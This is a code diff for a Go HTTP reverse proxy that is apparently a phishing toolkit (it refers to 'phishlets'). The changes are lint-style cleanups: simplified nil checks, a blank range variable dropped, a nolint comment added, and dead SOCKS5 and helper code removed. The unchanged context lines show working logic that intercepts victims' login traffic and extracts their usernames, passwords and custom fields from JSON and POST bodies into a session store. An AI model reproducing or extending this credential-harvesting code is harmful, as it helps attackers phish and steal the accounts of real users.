@@ -279,7 +279,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						var ok bool = false
+						ok := false
 						if err == nil {
 							ps.Index, ok = p.sids[sc.Value]
 							if ok {
@@ -437,7 +437,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
-								if um != nil && len(um) > 1 {
+								if len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -448,7 +448,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
-								if pm != nil && len(pm) > 1 {
+								if len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -460,7 +460,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
-									if cm != nil && len(cm) > 1 {
+									if len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -485,7 +485,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("POST %s = %s", k, v[0])
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
-										if um != nil && len(um) > 1 {
+										if len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -495,7 +495,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
-										if pm != nil && len(pm) > 1 {
+										if len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -506,7 +506,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
-											if cm != nil && len(cm) > 1 {
+											if len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -718,7 +718,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								var param_ok bool = true
 								if s, ok := p.sessions[ps.SessionId]; ok {
 									var params []string
-									for k, _ := range s.Params {
+									for k := range s.Params {
 										params = append(params, k)
 									}
 									if len(sf.with_params) > 0 {
@@ -1464,6 +1464,7 @@ func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
 	req.Header.Set(string(b), nothing_to_see_here)
 }
 
+//nolint:SA1019 // Deprecation of Dial in favor of DialContext not easily possible, since http_dialer does not offer a method for that
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
 		ptypes := []string{"http", "https", "socks5", "socks5h"}
@@ -1501,22 +1502,6 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 			}
 			p.Proxy.Tr.Dial = dproxy.Dial
 		}
-
-		/*
-			var auth *proxy.Auth = nil
-			if len(username) > 0 {
-				auth.User = username
-				auth.Password = password
-			}
-
-			proxy_addr := address + ":" + strconv.Itoa(port)
-
-			socks5, err := proxy.SOCKS5("tcp", proxy_addr, auth, proxy.Direct)
-			if err != nil {
-				return err
-			}
-			p.Proxy.Tr.Dial = socks5.Dial
-		*/
 	} else {
 		p.Proxy.Tr.Dial = nil
 	}
@@ -1544,10 +1529,4 @@ func (dumb dumbResponseWriter) WriteHeader(code int) {
 
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
-}
-
-func orPanic(err error) {
-	if err != nil {
-		panic(err)
-	}
 }
